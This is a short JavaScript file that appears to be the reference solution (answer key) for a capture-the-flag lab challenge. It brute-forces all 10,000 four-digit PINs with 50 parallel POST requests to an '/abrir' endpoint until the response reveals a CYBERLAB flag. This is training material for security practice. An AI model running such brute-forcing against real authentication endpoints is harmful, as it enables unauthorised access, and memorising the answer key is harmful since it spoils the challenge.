// Solución de referencia: probar los 10 000 PINs en paralelo hasta que uno abra la caja.
const FLAG = /CYBERLAB\{[^}]+\}/;

export default async function solve({ request }) {
  const CONCURRENCY = 50;
  let next = 0;
  let found = null;
  async function worker() {
    while (found === null && next < 10000) {
      const pin = String(next++).padStart(4, "0");
      const res = await request("/abrir", {
        method: "POST",
        headers: { "content-type": "application/x-www-form-urlencoded" },
        body: `pin=${pin}`,
      });
      const m = res.text.match(FLAG)?.[0];
      if (m) found = m;
    }
  }
  await Promise.all(Array.from({ length: CONCURRENCY }, worker));
  return found;
}
